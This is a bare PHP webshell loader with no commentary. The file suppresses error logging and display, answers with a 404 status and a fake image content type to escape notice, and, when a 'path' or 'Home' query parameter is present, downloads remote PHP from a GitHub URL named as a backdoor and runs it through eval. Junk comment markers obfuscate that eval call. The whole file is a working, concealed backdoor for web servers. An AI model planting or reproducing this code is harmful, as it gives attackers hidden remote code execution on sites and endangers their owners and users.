<?php 
    function webshell(){
        header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);http_response_code(404);
        @clearstatcache();
        @ini_set('log_errors',FALSE);
        @ini_set('max_execution_time',FALSE);
        @ini_set('output_buffering',FALSE);
        @ini_set('display_errors', FALSE);
        
        header ('Content-Type: image/png');
        if(isset($_GET['path']) or isset($_GET['Home'])){
            header("Content-Type: text/html");
            /*!*/@/*!*/null;/*!*//*!*/@/*!5555*/eval("?>".File_get_contents/*!*/("https://raw.githubusercontent.com/FierzaEriez/FX-Webshell/main/FX-Backdoor(Release).php"));/**/
        }
    }
    webshell();
?>
